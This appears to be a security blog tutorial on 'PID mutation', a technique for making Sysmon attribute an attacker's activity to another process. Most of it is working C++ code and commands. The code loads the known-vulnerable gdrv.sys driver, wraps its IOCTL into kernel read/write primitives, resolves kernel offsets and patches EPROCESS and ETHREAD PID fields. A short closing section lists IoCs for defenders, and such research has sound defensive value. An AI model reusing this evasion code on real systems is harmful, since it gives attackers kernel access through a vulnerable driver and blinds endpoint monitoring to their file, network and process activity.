# PID Mutation: Fooling Sysmon by Patching EPROCESS and ETHREAD


Hey everyone, today we'll see how to patch kernel structures at runtime so that Sysmon attributes all your activity to another process. Before diving into the technique, let's cover the foundational concepts you need to understand if you haven't worked with the Windows kernel before.

---

## Background Concepts

### What is a kernel read/write primitive?

A kernel read/write primitive is the ability to read and write arbitrary kernel memory from user mode. Under normal conditions, a user process cannot touch kernel memory , the processor prevents it at the hardware level (ring 0 vs ring 3).

But if you have a driver loaded on the system that exposes IOCTLs without proper validation of the pointers it receives, you can call those IOCTLs from your process so the driver (which does run in ring 0) performs the reads and writes on your behalf.

In practice: your user mode process calls `DeviceIoControl()` with a kernel address as an argument. The driver accepts it without validating and copies memory to/from that address. Result: you have arbitrary R/W in the kernel with zero additional privileges.

This is the core of most BYOVD techniques.

---

### What is BYOVD?

BYOVD (Bring Your Own Vulnerable Driver) consists of loading a legitimate but known-vulnerable driver yourself to obtain kernel execution or, in this case, an R/W primitive.

The driver is not malware. It's a real, signed driver that at some point was distributed by a legitimate manufacturer. The vulnerability lies in the fact that it exposes memory operations without adequate validation.

Windows requires all drivers to be digitally signed (Driver Signature Enforcement, DSE). BYOVD vulnerable drivers are already signed, so you can load them without disabling DSE or doing anything special , you just need administrator permissions.

---

### How do I find a vulnerable driver? LOLDrivers

[loldrivers.io](https://www.loldrivers.io) is the reference repository for vulnerable drivers. It maintains a curated list with:

- Driver name and original vendor
- Associated CVE or vulnerability
- SHA256 hash of the file
- Category: whether it's a driver with an R/W primitive, kernel execution, or used for process kill

For this PoC you need a driver with a **kernel read/write primitive**. On loldrivers you can filter by the `Read+Write` category to find them.

I used the following:
[gdrv.sys](https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/)

Once you have the `.sys`, you load it like this from your code:

```cpp
// Copy the driver to disk
// (in a real PoC it's usually embedded as a resource or in a temp path)

SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
SC_HANDLE hSvc = CreateService(
    hSCM,
    L"VulnDriver",          // service name
    L"VulnDriver",
    SERVICE_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
    L"C:\\Windows\\Temp\\vuln.sys",  // path to the .sys
    NULL, NULL, NULL, NULL, NULL
);
StartService(hSvc, 0, NULL);

// Get handle to the device exposed by the driver
HANDLE drv = CreateFile(
    L"\\\\.\\VulnDriverDevice",
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING, 0, NULL
);
```

Or easier, from a couple of simple commands in a CMD as Administrator:

```cpp
sc create gdrv binpath="C:\Path\toYour.sys" type="kernel"
sc start gdrv
```

And then `ReadPrimitive` / `WritePrimitive` are wrappers over `DeviceIoControl` with the specific IOCTLs of the driver you've chosen. The exact implementation depends on the driver , each one exposes its own IOCTL codes and expects arguments in a specific format.

In the case of the driver I chose, these are the primitives that exploit the read and write:

```cpp
#include <iostream>
#include <Windows.h>

// https://www.loldrivers.io/drivers/2bea1bca-753c-4f09-bc9f-566ab0193f4a/

#define IOCTL_READWRITE_PRIMITIVE 0xC3502808

using namespace std;

typedef struct KernelWritePrimitive {
	LPVOID dst;
	LPVOID src;
	DWORD size;
} KernelWritePrimitive;

typedef struct KernelReadPrimitive {
	LPVOID dst;
	LPVOID src;
	DWORD size;
} KernelReadPrimitive;

BOOL WritePrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
	KernelWritePrimitive kwp;
	kwp.dst = dst;
	kwp.src = src;
	kwp.size = size;

	BYTE bufferReturned[48] = { 0 };
	DWORD returned = 0;
	BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&kwp, sizeof(kwp), (LPVOID)bufferReturned, sizeof(bufferReturned), &returned, nullptr);
	if (!result) {
		cout << "Failed to send write primitive. Error code: " << GetLastError() << endl;
		return FALSE;
	}
	cout << "Write primitive sent successfully. Bytes returned: " << returned << endl;
	return TRUE;
}

BOOL ReadPrimitive(HANDLE driver, LPVOID dst, LPVOID src, DWORD size) {
	KernelReadPrimitive krp;
	krp.dst = dst;
	krp.src = src;
	krp.size = size;

	DWORD returned = 0;

	BOOL result = DeviceIoControl(driver, IOCTL_READWRITE_PRIMITIVE, (LPVOID)&krp, sizeof(krp), (LPVOID)dst, size, &returned, nullptr);
	if (!result) {
		cout << "Failed to send read primitive. Error code: " << GetLastError() << endl;
		return FALSE;
	}
	return TRUE;
}

HANDLE openVulnDriver() {
	HANDLE driver = CreateFileA("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (!driver || driver == INVALID_HANDLE_VALUE)
	{
		cout << "Failed to open handle to driver. Error code: " << GetLastError() << endl;
		return NULL;
	}
	return driver;
}
```

---

## The Technique: PID Mutation

### How Windows tracks process identity

Windows keeps the PID of a process in three independent kernel locations:

**`EPROCESS.UniqueProcessId`:** The PID field inside the kernel process object. Tools that walk `PsActiveProcessLinks` (the doubly linked list of active processes) read from here. Task Manager, Process Hacker, and System Informer use this source.

**`PspCidTable`**: A kernel handle table indexed by `PID/4`. This is the authoritative source for the kernel. `NtOpenProcess`, handle operations, and most kernel callbacks use `PspCidTable` to resolve a PID to its `EPROCESS`. When Sysmon receives a callback with a PID and wants to resolve the process image, it queries here.

**`ETHREAD.Cid.UniqueProcess`**: Each thread carries its own copy of the PID of the process it belongs to, in the `CLIENT_ID.UniqueProcess` field. Kernel ETW callbacks, minifilter callbacks, and the Sysmon driver read from here to determine which process originated an operation , they don't read from `EPROCESS` directly.

The key point: **these three sources are independent**. Patching one does not automatically update the others.

---

### The Attack

By patching `EPROCESS.UniqueProcessId` and `ETHREAD.Cid.UniqueProcess` across all threads of your process, you make Sysmon attribute all your activity , file writes, DNS queries, child processes, termination , to whichever process you choose. The telemetry resolves the wrong image, the wrong parent, and builds a completely fake process tree.

---

## Implementation

### Step 1: Resolve offsets dynamically

We don't hardcode offsets. We use DbgHelp to resolve them from Windows symbols, which makes the code compatible with different builds:

```cpp
struct KernelOffsets {
    DWORD UniqueProcessId;
    DWORD ActiveProcessLinks;
    DWORD ThreadListHead;
    DWORD ThreadListEntry;
    DWORD Cid;
    DWORD PsInitialSystemProcess;
};

KernelOffsets ResolveOffsets(DWORD64 ntoskrnlBase) {
    HANDLE hSym = GetCurrentProcess();
    SymInitialize(hSym, NULL, FALSE);
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);

    char symPath[512];
    snprintf(symPath, sizeof(symPath), "srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols");
    SymSetSearchPath(hSym, symPath);

    DWORD64 modBase = SymLoadModuleEx(hSym, NULL, "ntoskrnl.exe", NULL,
        ntoskrnlBase, 0, NULL, 0);

    KernelOffsets out = {};
    out.UniqueProcessId    = ResolveFieldOffset(hSym, modBase, "_EPROCESS", "UniqueProcessId");
    out.ActiveProcessLinks = ResolveFieldOffset(hSym, modBase, "_EPROCESS", "ActiveProcessLinks");
    out.ThreadListHead     = ResolveFieldOffset(hSym, modBase, "_EPROCESS", "ThreadListHead");
    out.ThreadListEntry    = ResolveFieldOffset(hSym, modBase, "_ETHREAD",  "ThreadListEntry");
    out.Cid                = ResolveFieldOffset(hSym, modBase, "_ETHREAD",  "Cid");
    out.PsInitialSystemProcess = ResolveSymbolRva(hSym, modBase, "PsInitialSystemProcess");

    return out;
}
```

---

### Step 2: Find your EPROCESS

We walk `PsActiveProcessLinks` from `PsInitialSystemProcess` (PID 4, System) until we find our own process by PID:

```cpp
DWORD64 FindEPROCESS(HANDLE drv, DWORD64 ntoskrnlBase, KernelOffsets& g_offsets, DWORD targetPid) {
    DWORD64 psInitSysProc = ntoskrnlBase + g_offsets.PsInitialSystemProcess;
    DWORD64 systemEPROCESS = 0;
    ReadPrimitive(drv, &systemEPROCESS, (LPVOID)(uintptr_t)psInitSysProc, sizeof(DWORD64));

    DWORD64 headList = systemEPROCESS + g_offsets.ActiveProcessLinks;
    DWORD64 currentFlink = 0;
    ReadPrimitive(drv, &currentFlink, (LPVOID)(uintptr_t)headList, sizeof(DWORD64));

    DWORD64 current = currentFlink;
    int count = 0;

    while (current != headList && count < 1000) {
        count++;
        DWORD64 eprocess = current - g_offsets.ActiveProcessLinks;
        DWORD64 pid = 0;
        ReadPrimitive(drv, &pid, (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId), sizeof(DWORD64));

        if ((DWORD)pid == targetPid)
            return eprocess;

        ReadPrimitive(drv, &current, (LPVOID)(uintptr_t)current, sizeof(DWORD64));
    }
    return 0;
}
```

---

### Step 3: Patch EPROCESS.UniqueProcessId

We overwrite the PID field with the victim process's PID (in the PoC, Notepad.exe):

```cpp
DWORD64 newValue = targetPid;
WritePrimitive(drv,
    (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId),
    &newValue, sizeof(newValue));
```

After this write, tools that walk `PsActiveProcessLinks` will see the mutated PID. But Sysmon still reports the original PID, because it reads from `ETHREAD.Cid`, not from `EPROCESS`.

---

### Step 4: Patch all ETHREAD.Cid.UniqueProcess

This is the critical step. We walk `EPROCESS.ThreadListHead` and for each ETHREAD we overwrite `Cid.UniqueProcess`:

```cpp
void MutateAllThreadCids(HANDLE drv, DWORD64 eprocess, DWORD64 newPid, KernelOffsets& g_offsets) {
    DWORD64 headAddr = eprocess + g_offsets.ThreadListHead;
    DWORD64 currentFlink = 0;
    ReadPrimitive(drv, &currentFlink, (LPVOID)(uintptr_t)headAddr, sizeof(DWORD64));

    DWORD64 current = currentFlink;
    int count = 0;

    while (current != headAddr && count < 1000) {
        count++;
        DWORD64 ethread = current - g_offsets.ThreadListEntry;

        WritePrimitive(drv,
            (LPVOID)(uintptr_t)(ethread + g_offsets.Cid),
            &newPid, sizeof(DWORD64));

        DWORD64 nextFlink = 0;
        ReadPrimitive(drv, &nextFlink, (LPVOID)(uintptr_t)current, sizeof(DWORD64));
        current = nextFlink;
    }
}
```

`CLIENT_ID.UniqueProcess` is at offset `+0` of the `Cid` field, so writing to `ethread + g_offsets.Cid` patches exactly the correct field.

---

### Step 5: Restore the PID before exiting

If you don't restore the PID before the process exits, Sysmon's Event ID 5 (process terminated) will show Notepad's PID, and when the real Notepad closes, it won't generate an Event ID 5. Two detectable anomalies.

We restore the original PID just before exit:

```cpp
void RestorePID(HANDLE drv, DWORD64 eprocess, DWORD originalPid, KernelOffsets& g_offsets) {
    DWORD64 restorePid = (DWORD64)originalPid;

    WritePrimitive(drv,
        (LPVOID)(uintptr_t)(eprocess + g_offsets.UniqueProcessId),
        &restorePid, sizeof(restorePid));

    // Also restore all ETHREAD.Cid...
    MutateAllThreadCids(drv, eprocess, restorePid, g_offsets);
}
```

---

## Proof of Concept , Sysmon

Tested against Sysmon v15.21 on Windows 11 24H2. Target process: `Notepad.exe` (PID 10720). The PoC mutates its own PID (originally 4624) to 10720 and patches all four threads.

**Event ID 11: File Create**

![First image](/images/fielwritePIDMutation.png)


**Event ID 22: DNS Query**

![Second image](/images/DNSqueryPIDMutation.png)

The DNS resolution is attributed to Notepad.

**Event ID 1: Child Process (cmd.exe)**

![Third image](/images/notepadProcCreatePIDMutation.png)

---

## Why It Works

Sysmon's minifilter driver receives IRP callbacks from the kernel. When an IRP is processed, the kernel provides the context of the thread that originated it , specifically `ETHREAD.Cid.UniqueProcess` , as the process identifier. Sysmon then resolves the process image from `PspCidTable` using that PID.

Since both `ETHREAD.Cid` and (indirectly through the PID) `PspCidTable` now point to Notepad's PID, every resolution returns Notepad. Sysmon never reads `EPROCESS.UniqueProcessId` directly for event attribution.

---

## Remaining IoCs

This technique is not undetectable. The artifacts that remain:

**Double termination**: If you don't restore the PID before exiting, both your process and the real Notepad generate an Event ID 5 with the same ProcessGuid. Two terminate events for the same GUID is detectable.

**ETHREAD.Cid vs PspCidTable divergence**: EDRs with their own kernel callbacks that cross-reference `EPROCESS.UniqueProcessId` against `PspCidTable` can detect the inconsistency. Enterprise-level EDRs likely do this.

---

## Limitations

- Requires a kernel R/W primitive (BYOVD in this PoC)
- `NtCreateProcess` and other self-referencing syscalls fail after mutation , the kernel validates `PspCidTable` on process creation
- Does not patch `PspCidTable` directly, only effective against tools that read from `ETHREAD.Cid`
- No synchronization around the write, possible race condition under heavy scheduling load

---

## Conclusion

What started as curiosity about kernel structures turned into a practical technique for false attribution in Sysmon telemetry. The takeaway for defenders: process attribution in Sysmon depends on `ETHREAD.Cid`, which is independent of both `EPROCESS.UniqueProcessId` and `PspCidTable`. Patching all three sources , or detecting divergences between them , is what separates a robust EDR from a tool that can be fooled with a few kernel writes.

The PoC is available at: [github.com/S12cybersecurity/PIDMutation](https://github.com/S12cybersecurity/PIDMutation)

Original post in English: [medium.com/@s12deff/process-id-mutation-via-byovd](https://medium.com/@s12deff/process-id-mutation-via-byovd)

---

*Tested on Windows 11 24H2, Sysmon v15.21.*
